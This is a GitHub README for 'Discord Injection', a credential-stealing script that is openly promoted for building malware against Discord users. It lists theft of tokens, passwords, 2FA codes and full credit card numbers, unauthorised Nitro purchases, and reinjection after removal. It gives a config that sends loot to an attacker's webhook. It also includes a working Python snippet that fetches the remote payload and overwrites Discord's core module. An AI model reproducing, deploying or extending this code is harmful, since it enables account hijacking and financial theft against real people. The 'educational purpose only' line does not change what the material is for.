<h1 align="center">
  Discord Injection 💉
</h1>

<h2 align="center">
  Steal all critical info from victims!
</h2>

<p align="center">
  Discord Injection is a simple .js script that you can use for your own malware to inject into discord which comes with many features!
</p>

<p align="center"> 
  <kbd>
<img src="https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord%20atom.png"></img>
  </kbd>
</p>

<p align="center">
  <img src="https://img.shields.io/github/languages/top/Rdimo/Discord-Injection?style=flat-square" </a>
  <img src="https://img.shields.io/github/last-commit/Rdimo/Discord-Injection?style=flat-square" </a>
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Rdimo_Injection&metric=ncloc" </a>
  <img src="https://img.shields.io/github/stars/Rdimo/Discord-Injection?color=7F9DE0&label=Stars&style=flat-square" </a>
  <img src="https://img.shields.io/github/forks/Rdimo/Discord-Injection?color=7F9DE0&label=Forks&style=flat-square" </a>
</p>

##### ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ [🌌・Discord](https://cheataway.com) ⋮  [💉・Setting up the injection](https://github.com/Rdimo/Discord-Injection#configure-discord-injection) ⋮ [💻・License](https://github.com/Rdimo/Discord-Injection#license) ⋮ [📜・ChangeLog](https://github.com/Rdimo/Discord-Injection#changelog)

<h2 align="center">
  Discord-Injection was made by

  Love ❌ code ✅
</h2>

---

## :fire: Features

✔ Customizable \
✔ Obfuscated (not advanced but the best it can go cuz of string replacement) \
✔ If Injection got removed it injects again! \
✔ Works on both Windows and Darwin! \
✔ Auto buy nitro! (toggleable) \
✔ Pings on info stolen! (toggleable) \
✔ Discord 2FA Codes for accounts with 2FA enabled.  \
✔ Disables login thru QR code! \
✔ Grabs Token, Nitro status, Billing Status + more! \
✔ Grabs Email & Password for their account. (updates if they change it) \
✔ Grabs whole credit card (if they enter one while injection is in) \
✔ Notifies when paypal account has been added!

--- 

## 🚀・Configure Discord Injection!

You'll need [Git](https://git-scm.com) to start off!
```sh-session
git@2.17.1 or higher
```

### 1. From your command line, clone and configure discord-injection:

```bash
# Clone this repository
$ git clone https://github.com/rdimo/Discord-injection.git

```
Copy the raw url of the [injection](./injection.js) and then paste it in your code

[forking](https://github.com/Rdimo/Discord-injection/fork) this repo is also a viable way but make sure to go into the code and change the config to your preferences! ⇣⇣⇣

```javascript
const config = {
    auto_buy_nitro: true, //automatically buys nitro when the victim adds credit card or paypal account or tries to buy nitro themselves
    ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
    ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
    embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
    embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info
    embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
    webhook: '%WEBHOOK%', //your discord webhook there obviously
    injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js', //injection url for when it reinjects

    ... //rest of the config you should NOT touch
};
```
> Don't quite understand how to set it up? [Click me!](https://github.com/Rdimo/Discord-Injection#want-to-use-it-but-dont-know-shit-about-coding)

## 🎈・Code example
Example of how you can implement this injection into your own malware
```py
import os
import re
import requests
webhook = 'https://discord.com/apwebhooks/123456789/abcdefghijklmnopqrstuvwxyz'

def inject():
    for _dir in os.listdir(os.getenv('localappdata')):
        if 'discord' in _dir.lower():
            for __dir in os.listdir(os.path.abspath(os.getenv('localappdata')+os.sep+_dir)):
                if re.match(r'app-(\d*\.\d*)*', __dir):
                    abspath = os.path.abspath(os.getenv('localappdata')+os.sep+_dir+os.sep+__dir) 
                    f = requests.get("https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js").text.replace("%WEBHOOK%", webhook)
                    with open(abspath+'\\modules\\discord_desktop_core-2\\discord_desktop_core\\index.js', 'w', encoding="utf-8") as indexFile:
                        indexFile.write(f)
                    os.startfile(abspath+os.sep+_dir+'.exe')

if __name__ == "__main__":
    inject()
```

## 👴・Want to use it but don't know shit about coding?
No worries, [Hazard-Token-Grabber-V2](https://github.com/Rdimo/Hazard-Token-Grabber-V2) is a stealer that uses this injection + steals more!

## 🤝・Contributing

Any ideas on how to improve the injection? Or just think you got something you want to see being added? [Open a new issue](https://github.com/rdimo/Discord-injection/issues)!

Found a bug? please please please [Open a new issue](https://github.com/rdimo/Discord-injection/issues) and tell me about it so I can fix it asap

## 🎉・Upcoming/Todo
- Grab ip, name etc...
- Fix bugs
- More settings

## :seedling:・Inspiration
Discord-Injection is inspired by [stanleys](https://github.com/Stanley-GF) injection but has been upgraded quite alot since

- [his injection](https://github.com/Stanley-GF/Arizona/blob/main/src/injection/injection-clean.js)

## 📄・License 

This project is licensed under the GNU General Public License v3.0 License - see the [LICENSE.md](./LICENSE) file for details

・Educational purpose only and all your consequences caused by you actions is your responsibility 

・Selling this **Free** injection is forbidden

・If you make a copy of this/or fork it, it **must** be open-source and have credits linking to this repo

## 💭・ChangeLog
```diff

v0.0.4 ⋮ 2022-03-31
+ Cleanup

v0.0.3 ⋮ 2022-03-31
+ Fixed Typo

v0.0.2 ⋮ 2022-03-30
+ Added new seperate function that sends out when a nitro code has been purchased
+ Fixed 2fa code grabber
+ Fixed auto nitro buyer

v0.0.1 ⋮ 2022-03-28
+ Added BetterDiscord support
+ Added dead code into obfuscation to protect even more
- Re-added status code checker since I Accidently removed it
```